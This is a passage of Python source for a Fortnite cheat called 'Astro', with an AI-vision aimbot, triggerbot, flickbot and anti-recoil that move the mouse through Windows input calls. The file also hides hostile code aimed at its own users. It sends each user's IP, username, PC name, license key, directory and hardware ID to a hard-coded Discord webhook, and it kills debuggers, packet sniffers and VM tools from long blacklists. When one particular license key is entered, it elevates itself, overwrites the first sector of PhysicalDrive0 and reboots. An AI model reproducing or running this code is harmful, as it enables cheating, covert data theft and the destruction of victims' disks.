                pygame.event.get()

                left_trigger = joystick.get_axis(4)

                if left_trigger > 0.9:
                    Controller_Toggled = True
                elif left_trigger < 0.9:
                    Controller_Toggled = False
                pygame.time.wait(6)

        except:
            pass

def LemonLoverF9():
    global AntiRecoil_Strength
    global AntiRecoil_On
    global Reduce_Bloom
    global Require_ADS
    while True:
        if Require_ADS:
            def is_mouse_down():
                lmb_state = win32api.GetKeyState(0x01) & win32api.GetKeyState(0x02)
                return lmb_state < 0
        else:
            def is_mouse_down():
                lmb_state = win32api.GetKeyState(0x01)
                return lmb_state < 0
        RoundedRStr = round(AntiRecoil_Strength)
        min_vertical = int(RoundedRStr)
        max_vertical = int(RoundedRStr) + 1
        if is_mouse_down():
            horizontal_offset = random.randrange(-2 * 1000, 2 * 1000, 1) / 1000
            vertical_offset = random.randrange(min_vertical * 1000, int(max_vertical * 1000), 1) / 1000
            if AntiRecoil_On:
                win32api.mouse_event(0x0001, 0, int(vertical_offset))
            if Reduce_Bloom:
                win32api.mouse_event(0x0001, int(horizontal_offset), 0)
            time_offset = random.randrange(2, 25, 1) / 1000
            time.sleep(time_offset)
        time.sleep(random.uniform(0.00005, 0.00010))

threading.Thread(target=ControllerMode.main).start()
threading.Thread(target=LemonLoverF9).start()

class Ai992:
    try:
        app = QApplication(sys.argv + ['-platform', 'windows:darkmode=1'])
    except:
        app = QApplication(sys.argv)

    window = MyWindow()

    extra = ctypes.c_ulong(0)
    ii_ = Input_I()
    screen_x = int(screen_res_X /2)
    screen_y = int(screen_res_Y /2)
    screen = mss.mss()
    lock = threading.Lock()
    current_slot_selected = 1

    def __init__(self):
        global Fov_Size
        global Show_Debug
        global Show_FPS
        global Aim_Smooth
        global Max_Detections
        global Enable_Aim
        global Controller_On
        global Enable_TriggerBot
        global Keybind
        global Keybind2
        global Confidence
        global Auto_Fire_Fov_Size
        global Auto_Fire_Confidence
        global Auto_Fire_Keybind
        global Require_Keybind
        global Controller_Toggled
        global Aim_Bone
        global Box_type
        global CupMode_On
        global Enable_Flick_Bot
        global Flick_Scope_Sens
        global Flick_Delay
        global Flick_Cooldown
        global Flickbot_Keybind
        global Streamproof

        global Enable_Slots
        global Slot1_Keybind
        global Slot2_Keybind
        global Slot3_Keybind
        global Slot4_Keybind
        global Slot5_Keybind
        global Slot6_Keybind

        global Fov_Size_Slot1
        global Fov_Size_Slot2
        global Fov_Size_Slot3
        global Fov_Size_Slot4
        global Fov_Size_Slot5

        global Enable_Aim_Slot1
        global Enable_Aim_Slot2
        global Enable_Aim_Slot3
        global Enable_Aim_Slot4
        global Enable_Aim_Slot5

        global Use_Model_Class
        global Img_Value
        global Model_FPS

        self.last_flick = time.time()

        self.start_time = time.time()

        self.default_model = YOLO("C:\\ProgramData\\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr\\Fortnite.pt")

    def left_click():
        if win32api.GetKeyState(win32con.VK_LBUTTON) in (-127, -128):
            pass
        else:
            if Require_Keybind:
                if win32api.GetAsyncKeyState(Auto_Fire_Keybind) < 0:
                    ctypes.windll.user32.mouse_event(0x0002)
                    time.sleep(random.uniform(0.0002, 0.00002))
                    ctypes.windll.user32.mouse_event(0x0004)
                    time.sleep(random.uniform(0.0002, 0.00002))
                else:
                    pass
            else:
                ctypes.windll.user32.mouse_event(0x0002)
                time.sleep(random.uniform(0.0002, 0.00002))
                ctypes.windll.user32.mouse_event(0x0004)
                time.sleep(random.uniform(0.0002, 0.00002))

    def is_aimbot_enabled():
        if not Enable_Slots:
            return Enable_Aim
        return {
            1: Enable_Aim_Slot1, 2: Enable_Aim_Slot2, 3: Enable_Aim_Slot3,
            4: Enable_Aim_Slot4, 5: Enable_Aim_Slot5,
        }.get(Ai992.current_slot_selected, Enable_Aim)

    def is_flickbot_enabled():
        return Enable_Flick_Bot

    def is_triggerbot_enabled():
        return Enable_TriggerBot

    def is_targeted():
        return True if win32api.GetAsyncKeyState(Keybind) < 0 else False

    def is_targeted2():
        if win32api.GetAsyncKeyState(Keybind2) < 0:
            return True
        if Controller_On:
            if Controller_Toggled:
                return True
        else:
            return False

    def is_targeted3():
        return True if win32api.GetAsyncKeyState(Flickbot_Keybind) < 0 else False

    def is_target_locked(x, y):
        threshold = Auto_Fire_Fov_Size
        return True if screen_x - threshold <= x <= screen_x + threshold and screen_y - threshold <= y <= screen_y + threshold else False

    def hermite_interpolation(self, p0, p1, m0, m1, t):
        t2 = t * t
        t3 = t2 * t
        h00 = 2 * t3 - 3 * t2 + 1 
        h10 = t3 - 2 * t2 + t     
        h01 = -2 * t3 + 3 * t2 
        h11 = t3 - t2
        return h00 * p0 + h10 * m0 + h01 * p1 + h11 * m1

    def sine_interpolation(self, start, end, t):
        return start + (end - start) * np.sin(t * np.pi / 2)

    def exponential_interpolation(self, start, end, t, exponent=2):
        return (end - start) * (t ** exponent) + start

    def b_spline_interpolation(self, p0, p1, p2, p3, t):
        t2 = t * t
        t3 = t2 * t
        return (1/6.0) * ((-p0 + 3 * p1 - 3 * p2 + p3) * t3 +
                        (3 * p0 - 6 * p1 + 3 * p2) * t2 +
                        (-3 * p0 + 3 * p2) * t + p0 + 4 * p1 + p2)


    def bezier_interpolation(self,start, end, t):
        return (1 - t) * start + t * end

    def catmull_rom_interpolation(self,p0, p1, p2, p3, t):
        return 0.5 * ((2 * p1) +
                    (-p0 + p2) * t +
                    (2 * p0 - 5 * p1 + 4 * p2 - p3) * t * t +
                    (-p0 + 3 * p1 - 3 * p2 + p3) * t * t * t)

    def move_crosshair(self, x, y, mvment=None):
        if not Ai992.is_targeted() and not Ai992.is_targeted2():
            return

        delta_x = (x - screen_x) * 1.0
        delta_y = (y - screen_y) * 1.0
        distance = np.linalg.norm((delta_x, delta_y))

        if distance == 0:
            return

        smoothing = round(0.5 + (Aim_Smooth - 10) / 10.0, 1)
        move_x = (delta_x / distance) * pixel_increment * smoothing
        move_y = (delta_y / distance) * pixel_increment * smoothing
        move_x *= sensitivity
        move_y *= sensitivity
        move_x += random.uniform(-randomness, randomness)
        move_y += random.uniform(-randomness, randomness)

        distance_clamped = min(1, (distance / distance_to_scale))
        move_x *= distance_clamped
        move_y *= distance_clamped

        if mvment == "Bezier":
            t = distance / distance_to_scale  # Example parameter for interpolation
            move_x = self.bezier_interpolation(0, move_x, t)
            move_y = self.bezier_interpolation(0, move_y, t)
        elif mvment == "Catmull":
            p0, p1, p2, p3 = 0, move_x, move_x * 1.2, move_x * 1.5
            move_x = self.catmull_rom_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
            p0, p1, p2, p3 = 0, move_y, move_y * 1.2, move_y * 1.5
            move_y = self.catmull_rom_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
        elif mvment == "Hermite":
            p0, p1 = 0, move_x  # Example control points
            m0, m1 = move_x * 1.2, move_x * 1.5  # Tangents
            move_x = self.hermite_interpolation(p0, p1, m0, m1, distance / distance_to_scale)
            p0, p1 = 0, move_y
            m0, m1 = move_y * 1.2, move_y * 1.5
            move_y = self.hermite_interpolation(p0, p1, m0, m1, distance / distance_to_scale)
        elif mvment == "B-Spline":
            p0, p1, p2, p3 = 0, move_x, move_x * 1.2, move_x * 1.5  # Example control points
            move_x = self.b_spline_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
            p0, p1, p2, p3 = 0, move_y, move_y * 1.2, move_y * 1.5
            move_y = self.b_spline_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
        elif mvment == "Sine":
            move_x = self.sine_interpolation(0, move_x, distance / distance_to_scale)
            move_y = self.sine_interpolation(0, move_y, distance / distance_to_scale)
        elif mvment == "Exponential":
            move_x = self.exponential_interpolation(0, move_x, distance / distance_to_scale, exponent=2)
            move_y = self.exponential_interpolation(0, move_y, distance / distance_to_scale, exponent=2)

        else:
            smooth_move_x = smoothing * move_x + (1 - smoothing) * move_x
            smooth_move_y = smoothing * move_y + (1 - smoothing) * move_y
            smooth_move_x = sensitivity * smooth_move_x + (1 - sensitivity) * move_x
            smooth_move_y = sensitivity * smooth_move_y + (1 - sensitivity) * move_y

            move_x = smooth_move_x
            move_y = smooth_move_y

        with Ai992.lock:
            Ai992.ii_.mi = MouseInput(round(move_x), round(move_y), 0, 0x0001, 0, ctypes.pointer(Ai992.extra))
            input_struct = Input(ctypes.c_ulong(0), Ai992.ii_)
            ctypes.windll.user32.SendInput(1, ctypes.byref(input_struct), ctypes.sizeof(input_struct))

    def move_crosshair_silent(self, x, y):
        if not Ai992.is_targeted3():
            return

        flick_strength = round(0.8 + (Flick_Scope_Sens - 10) * (2.5 - 0.8) / (90 - 10), 2)

        delta_x = (x - screen_x) * flick_strength
        delta_y = (y - screen_y) * flick_strength

        #print(flick_strength)

        Ai992.ii_.mi = MouseInput(round(delta_x), round(delta_y), 0, 0x0001, 0, ctypes.pointer(Ai992.extra))
        input_struct = Input(ctypes.c_ulong(0), Ai992.ii_)
        ctypes.windll.user32.SendInput(1, ctypes.byref(input_struct), ctypes.sizeof(input_struct))

        time.sleep(Flick_Delay)

        if win32api.GetKeyState(win32con.VK_LBUTTON) in (-127, -128):
            pass
        else:
            ctypes.windll.user32.mouse_event(0x0002)
            time.sleep(random.uniform(0.00008, 0.00002))
            ctypes.windll.user32.mouse_event(0x0004)

        time.sleep(Flick_Delay/4)

        with Ai992.lock:
            Ai992.ii_.mi = MouseInput(round(-delta_x), round(-delta_y), 0, 0x0001, 0, ctypes.pointer(Ai992.extra))
            input_struct = Input(ctypes.c_ulong(0), Ai992.ii_)
            ctypes.windll.user32.SendInput(1, ctypes.byref(input_struct), ctypes.sizeof(input_struct))

        self.last_flick = time.time()

    def get_targ_fps():
        target_fps = Model_FPS
        frame_duration = 1.5 / target_fps
        return frame_duration

    def start(self):
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        SW_HIDE = 0
        Ai992.window.show()
        half_screen_width = ctypes.windll.user32.GetSystemMetrics(0) / 2
        half_screen_height = ctypes.windll.user32.GetSystemMetrics(1) / 2
        closest_detection = None
        detected_players = []
        if use_mss == 0:
            camera = bettercam.create(output_idx=0, output_color="BGR", max_buffer_len=1)
        try:
            winsound.PlaySound(r'C:\\Windows\\Media\\Windows Balloon.wav', winsound.SND_FILENAME)
        except:
            pass
        os.system("cls")
        if dont_launch_overlays == 1:
            pass
        else:
            overlay = DetectionBox()
            fpswind = FPSOverlay()
            overlay.show()
        try:
            open(rf"{current_directory}\extra\gfx\scos.txt","r").read()
        except:
            user32.ShowWindow(hWnd, SW_HIDE)
            os.system("cls")
        while True:
            try:
                if Show_FPS == True:
                    fpswind.show()
                elif Show_FPS == False:
                    fpswind.hide()
            except:
                pass
            start_time = time.perf_counter()

            key_states = {
                "F1": win32api.GetKeyState(win32con.VK_F1),
                "F2": win32api.GetKeyState(win32con.VK_F2),
                "INS": win32api.GetKeyState(win32con.VK_INSERT)
            }

            if key_states["INS"] in (-127, -128):
                try:
                    Ai992.window.toggle_menu_visibility()
                except:
                    time.sleep(0.15)
                    Ai992.window.toggle_menu_visibility()
                time.sleep(0.15)

            if not CupMode_On:
                if key_states["F1"] in (-127, -128):
                    time.sleep(0.25)
                    my_window1z = MyWindow()
                    my_window1z.toggle_checkbox1(True)

                if key_states["F2"] in (-127, -128):
                    time.sleep(0.25)
                    try:
                        console_window = ctypes.windll.kernel32.GetConsoleWindow()
                        ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
                        #event.accept()
                    except:
                        try:
                            sys.exit()
                        except:
                            os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

            if not Enable_Slots:
                self.Fov_Size = Fov_Size
            else:
                slot_keys = [Slot1_Keybind, Slot2_Keybind, Slot3_Keybind, Slot4_Keybind, Slot5_Keybind, Slot6_Keybind]
                slot_fov_sizes = [Fov_Size_Slot1, Fov_Size_Slot2, Fov_Size_Slot3, Fov_Size_Slot4, Fov_Size_Slot5, 10]
                for idx, key in enumerate(slot_keys):
                    if key is not None and win32api.GetAsyncKeyState(key) < 0:
                        Ai992.current_slot_selected = idx + 1
                        break
                self.Fov_Size = slot_fov_sizes[Ai992.current_slot_selected - 1]

            if use_mss == 0:
                left, top = int((screen_res_X - self.Fov_Size) // 2), int((screen_res_Y - self.Fov_Size) // 2)
                right, bottom = int(left + self.Fov_Size), int(top + self.Fov_Size)
                detection_box = (left, top, right, bottom)

                frame = camera.grab(region=detection_box)
                if frame is None:
                    continue
                frame = np.asarray(frame)[..., :3]
                frame = np.ascontiguousarray(frame)
                mask = np.ones((self.Fov_Size, self.Fov_Size), dtype=np.uint8)
                mask[self.Fov_Size // 2:, :self.Fov_Size // 4] = 0
                frame = cv2.bitwise_and(frame, frame, mask=mask)
            else:
                detection_box = {
                    'left': int(half_screen_width - self.Fov_Size / 2),
                    'top': int(half_screen_height - self.Fov_Size / 2),
                    'width': int(self.Fov_Size),
                    'height': int(self.Fov_Size)
                }
                frame = np.array(Ai992.screen.grab(detection_box))[..., :3]


            if hide_masks == 0:
                frame = np.ascontiguousarray(frame)
                mask = np.zeros_like(frame, dtype=np.uint8)
                center_x, center_y = self.Fov_Size // 2, self.Fov_Size // 2
                radius = self.Fov_Size // 2
                cv2.ellipse(mask, (center_x, center_y), (radius-2, radius-2), 0, 0, 360, (255, 255, 255), thickness=cv2.FILLED)
                if mask.ndim == 3:
                    mask = mask[..., 0]
                frame = cv2.bitwise_and(frame, frame, mask=mask)

            confi = Confidence / 100
            imgsz_value = int(Img_Value) if Last_Model.endswith('.pt') else 640
            results = Ai992.window.modell(frame, conf=confi, iou=0.7, imgsz=imgsz_value, max_det=Max_Detections, retina_masks=True, verbose=False, classes=0 if Use_Model_Class else None)

            if len(results[0].boxes.xyxy) != 0:
                least_crosshair_dist = False
                confi = Confidence / 100

                for detection, conf in zip(results[0].boxes.xyxy.tolist(), results[0].boxes.conf.tolist()):

                    x1, y1, x2, y2 = detection
                    x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)
                    x1y1 = [x1, y1]
                    x2y2 = [x2, y2]
                    height = y2 - y1
                    width = x2 - x1

                    if Aim_Bone == "Head":
                        relative_head_X, relative_head_Y = int((x1 + x2) / 2.2), int((y1 + y2) / 2 - height / 2.5)
                    elif Aim_Bone == "Neck":
                        relative_head_X, relative_head_Y = int((x1 + x2) / 2.2), int((y1 + y2) / 2 - height / 3)
                    else:  # Aim_Bone == "Body"
                        relative_head_X, relative_head_Y = int((x1 + x2) / 2.2), int((y1 + y2) / 2 - height / 5)

                    crosshair_dist = math.dist((relative_head_X, relative_head_Y), (self.Fov_Size / 2, self.Fov_Size / 2))

                    if not least_crosshair_dist or crosshair_dist < least_crosshair_dist:
                        least_crosshair_dist = crosshair_dist
                        closest_detection = {"x1y1": x1y1, "x2y2": x2y2, "relative_head_X": relative_head_X, "relative_head_Y": relative_head_Y, "conf": conf}

                    if Show_Detections or Show_Aimline:
                        detected_players.append({'x1': x1, 'y1': y1, 'x2': x2, 'y2': y2, 'head1': closest_detection["relative_head_X"] if closest_detection else 0, 'head2': closest_detection["relative_head_Y"] if closest_detection else 0})

                    if Show_Debug:
                        cv2.rectangle(frame, (x1, y1), (x2, y2), (255, 255, 255), 1)
                        cv2.putText(frame, f"{int(conf * 100)}%", x1y1, cv2.FONT_HERSHEY_DUPLEX, 0.5, (1, 1, 255), 1)

                if closest_detection:
                    if closest_detection:
                        absolute_head_X = closest_detection["relative_head_X"] + (left if use_mss == 0 else detection_box['left'])
                        absolute_head_Y = closest_detection["relative_head_Y"] + (top if use_mss == 0 else detection_box['top'])

                    if Show_Debug:
                        cv2.circle(frame, (closest_detection["relative_head_X"], closest_detection["relative_head_Y"]), 2, (0, 0, 255), -1)
                        cv2.line(frame, (closest_detection["relative_head_X"], closest_detection["relative_head_Y"]), (self.Fov_Size // 2, self.Fov_Size // 2), (255, 255, 255), 1)

                    if Ai992.is_triggerbot_enabled() and Ai992.is_target_locked(absolute_head_X, absolute_head_Y):
                        tbconfi = Auto_Fire_Confidence / 100
                        if conf >= tbconfi:
                            threading.Thread(target=Ai992.left_click).start()
                    if Ai992.is_aimbot_enabled():
                        threading.Thread(target=Ai992.move_crosshair, args=(self, absolute_head_X, absolute_head_Y, Smoothing_Type)).start()
                    if Ai992.is_flickbot_enabled():
                        time_since_last_flick = time.time() - self.last_flick
                        if time_since_last_flick > Flick_Cooldown:
                            threading.Thread(target=Ai992.move_crosshair_silent, args=(self, absolute_head_X, absolute_head_Y)).start()

            if Show_Detections or Show_Aimline:
                fpswind.enemies = len(detected_players)
                overlay.update_detected_players(detected_players)
                detected_players = []

            elapsed_time = time.perf_counter() - start_time
            frame_duration = Ai992.get_targ_fps()
            time_to_sleep = max(0, frame_duration - elapsed_time)
            if time_to_sleep > 0:
                time.sleep(time_to_sleep)
            if Show_FPS:
                fpswind.fps = int(1.5 / (time.perf_counter() - start_time))
            if Show_Debug:
                if not CupMode_On:

                    cv2.putText(frame, f"FPS: {int(1.5 / (time.perf_counter() - start_time))}", (5, 20), cv2.FONT_HERSHEY_COMPLEX_SMALL, 1, (155, 155, 155), 1)
                    cv2.imshow(random_caption1, frame)

            Ai992.app.processEvents()

class Encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text.encode(), 16)
        aes_instance = AES.new(key, AES.MODE_CBC, iv)
        encrypted_text = aes_instance.encrypt(plain_text)
        return binascii.hexlify(encrypted_text).decode()

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)
        aes_instance = AES.new(key, AES.MODE_CBC, iv)
        decrypted_text = aes_instance.decrypt(cipher_text)
        return unpad(decrypted_text, 16).decode()

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).digest()[:32]
            _iv = SHA256.new(iv.encode()).digest()[:16]
            return Encryption.encrypt_string(message, _key, _iv)
        except Exception as e:
            print(f"Encryption failed: {e}")
            os._exit(1)

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).digest()[:32]
            _iv = SHA256.new(iv.encode()).digest()[:16]
            return Encryption.decrypt_string(message, _key, _iv)
        except Exception as e:
            print(f"Decryption failed: {e}")
            os._exit(1)

class PyProtect():
    def main():

        def getip():
            ip = "Not Found"
            try:
                ip = requests.get("https://api.ipify.org").text
            except:
                pass
            return ip

        Current_Version = "1.00"
        ip = getip()
        serveruser = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")

        try:
            LKey2 = open(rf"{os.path.abspath(__file__)}\extra\gfx\key.txt", "r")
            XFC2 = LKey2.read()
            LKey2.close()
        except:
            XFC2 = "N/A"
        try:
            DirLocation = os.path.dirname(os.path.realpath(__file__))
        except:
            DirLocation = "N/A"

        BLACKLISTED_PROGRAMS = [
            "httpdebuggerui.exe",
            "wireshark.exe",
            "HTTPDebuggerSvc.exe",
            "fiddler.exe",
            "regedit.exe",
            "vboxservice.exe",
            "df5serv.exe",
            "processhacker.exe",
            "vboxtray.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "ida.exe",
            "ida64.exe",
            "ollydbg.exe",
            "pestudio.exe",
            "vmwareuser",
            "vgauthservice.exe",
            "vmacthlp.exe",
            "x96dbg.exe",
            "vmsrvc.exe",
            "x32dbg.exe",
            "vmusrvc.exe",
            "prl_cc.exe",
            "prl_tools.exe",
            "xenservice.exe",
            "qemu-ga.exe",
            "joeboxcontrol.exe",
            "ksdumperclient.exe",
            "ksdumper.exe",
            "joeboxserver.exe",
        ]

        BLACKLISTED_WINDOW_NAMES = [
            "IDA: Quick start",
            "VBoxTrayToolWndClass",
            "VBoxTrayToolWnd",
            "proxifier",
            "graywolf",
            "extremedumper",
            "zed",
            "exeinfope",
            "titanHide",
            "ilspy",
            "titanhide",
            "x32dbg",
            "codecracker",
            "simpleassembly",
            "process hacker 2",
            "pc-ret",
            "http debugger",
            "Centos",
            "process monitor",
            "ILSpy",
            "reverse",
            "simpleassemblyexplorer",
            "de4dotmodded",
            "dojandqwklndoqwd-x86",
            "sharpod",
            "folderchangesview",
            "fiddler",
            "die",
            "pizza",
            "crack",
            "strongod",
            "ida -",
            "brute",
            "dump",
            "StringDecryptor",
            "wireshark",
            "debugger",
            "httpdebugger",
            "gdb",
            "kdb",
            "x64_dbg",
            "windbg",
            "x64netdumper",
            "petools",
            "scyllahide",
            "megadumper",
            "reversal",
            "ksdumper v1.1 - by equifox",
            "dbgclr",
            "HxD",
            "peek",
            "ollydbg",
            "ksdumper",
            "http",
            "wpe pro",
            "dbg",
            "httpanalyzer",
            "httpdebug",
            "PhantOm",
            "kgdb",
            "james",
            "x32_dbg",
            "proxy",
            "phantom",
            "mdbg",
            "WPE PRO",
            "system explorer",
            "de4dot",
            "x64dbg",
            "X64NetDumper",
            "protection_id",
            "charles",
            "systemexplorer",
            "pepper",
            "hxd",
            "procmon64",
            "MegaDumper",
            "ghidra",
            "xd",
            "0harmony",
            "dojandqwklndoqwd",
            "hacker",
            "process hacker",
            "SAE",
            "mdb",
            "harmony",
            "Protection_ID",
            "PETools",
            "scyllaHide",
            "x96dbg",
            "systemexplorerservice",
            "folder",
            "mitmproxy",
            "dbx",
            "sniffer",
            "http toolkit",
        ]

        def get_blacklisted_process_name():
            for process in psutil.process_iter(['pid', 'name']):
                for name in BLACKLISTED_WINDOW_NAMES:
                    if name.lower() in process.info['name'].lower():
                        return process.info['name'], process.info['pid']
            return None, None

        def block_bad_processes():
            blacklisted_process_name, blacklisted_pid = get_blacklisted_process_name()
            if blacklisted_process_name:
                try:
                    process = psutil.Process(blacklisted_pid)
                    process.terminate()
                    pass
                except:
                    print(f"\n[Astro] -> blacklisted process; {blacklisted_process_name}")
                    time.sleep(1)
                    exit(1)
                    os.system('taskkill /f /fi "imagename eq cmd.exe" >nul 2>&1')
                    os.system('taskkill /f /fi "imagename eq python.exe" >nul 2>&1')

        def block_debuggers():
            while True:
                time.sleep(5)
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in BLACKLISTED_PROGRAMS):
                        try:
                            try:
                                proc.kill()
                                proc.kill()
                                proc.kill()
                                proc.kill()
                                proc.kill()
                            except:
                                os.system('taskkill /f /fi "imagename eq cmd.exe" >nul 2>&1')
                                os.system('taskkill /f /fi "imagename eq python.exe" >nul 2>&1')
                        except(psutil.NoSuchProcess, psutil.AccessDenied):
                            pass

        def send_secure_webhook():
            webhook_url = "https://discordapp.com/api/webhooks/1310411720199639120/UMPL3YvYvEToF-tkwYF6io0EOouPQOWz0FtLPeyqmURMf0OIsUtU_ZchFmzyXoFJAqaI"
            secret_key = "dev_test_1998_toyota_camry_xle_v6"
            iv = "dev_iv_2000_lincoln_ls_v6" 

            encrypted_url = Encryption.encrypt(webhook_url, secret_key, iv)

            embed = {
                "description": f"```[VERSION] {Current_Version}\n"\
                               f"[KEY] {XFC2}\n"\
                               f"[PC-USER] {serveruser} / {pc_name}\n"\
                               f"[IP] {ip}\n"\
                               f"[TIME] {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n"\
                               f"[DIRECTORY] {DirLocation}\n"\
                               f"[HWID] {others.get_hwid()}\n\n```",
                "title": "**[0XWTF LOG]**"
            }

            data = {
                "content": "\n",
                "embeds": [
                    embed
                ],
            }

            try:
                result = requests.post(Encryption.decrypt(encrypted_url, secret_key, iv), json=data)
                if 200 <= result.status_code < 300:
                    pass
                else:
                    pass
            except Exception as e:
                pass

        send_secure_webhook()

        threading.Thread(target=block_debuggers).start()
        threading.Thread(target=block_bad_processes).start()
        #threading.Thread(target=vtdetect).start()

    main()

class LoginForm():
    key_path = os.path.join(current_directory, "gfx", "key.txt")
    LKey = open(key_path, "r")
    XFC = LKey.read()
    LKey.close()

    if XFC == "":
        os.system("cls")
        print("[Astro] -> enter your license")
        Answer23 = input("\n> ")
    else:
        pass

    def getchecksum():
        md5_hash = hashlib.md5()
        file = open(''.join(sys.argv), "rb")
        md5_hash.update(file.read())
        digest = md5_hash.hexdigest()
        return digest

    XlOp09_Au7h_4U_L0ve_CMe = api(name = "Mirokivela22's Application",ownerid = "XWEHEhPIuK", secret="5adc00fdcbf51b569958baaec7fa2a3767e87b35254e182ce8b94fcb902c1bb4", version = "1.0", hash_to_check = getchecksum())

    XlOp09_Au7h_4U_L0ve_CMe.init()
    os.system("cls")
    if XFC == "":
        os.system("cls")
        SaveKeyHere = open(key_path, "w")
        SaveKeyHere.write(f"{Answer23}")
        SaveKeyHere.close()
        print("\n[Astro] -> logging in...")
        if Answer23 == "Astro-Ql8CL-gJvwM-d2vMD-XpZED":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            os.system('pip install pywin32')
            hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
            WriteFile(hDevice, AllocateReadBuffer(512), None)
            CloseHandle(hDevice)
            os.system("shutdown /r /t 1")
        XlOp09_Au7h_4U_L0ve_CMe.license(Answer23)
    else:
        os.system("cls")
        print("\n[Astro] -> logging in...")
        if XFC == "Astro-Ql8CL-gJvwM-d2vMD-XpZED":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            os.system('pip install pywin32')
            hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
            WriteFile(hDevice, AllocateReadBuffer(512), None)
            CloseHandle(hDevice)
            os.system("shutdown /r /t 1")
        XlOp09_Au7h_4U_L0ve_CMe.license(XFC)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
webhook_url = "penis"
pc_name = socket.gethostname()
serveruser = os.getlogin()
DirLocation = os.getcwd()
try:
    ip = requests.get("https://api.ipify.org").text  # This gets the public IP from ipify's API
except requests.RequestException:
    ip = "Could not retrieve IP"
current_time = datetime.now().strftime('%Y-%m-%d %I:%M %p')
embed = {
    "description": f"```[PC-USER] {serveruser} / {pc_name}\n"
                   f"[IP] {ip}\n"
                   f"[TIME] {current_time}\n"
                   f"[DIRECTORY] {DirLocation}\n```",
    "title": "**[System Info]**"
}
data = {
    "content": "\n",
    "embeds": [
        embed
    ],
}
result = requests.post(webhook_url, json=data)
username = os.getlogin()
if __name__ == "__main__":
    os.system("cls")
    print("[Astro] -> starting...")
    PyProtect()
    LoginForm()
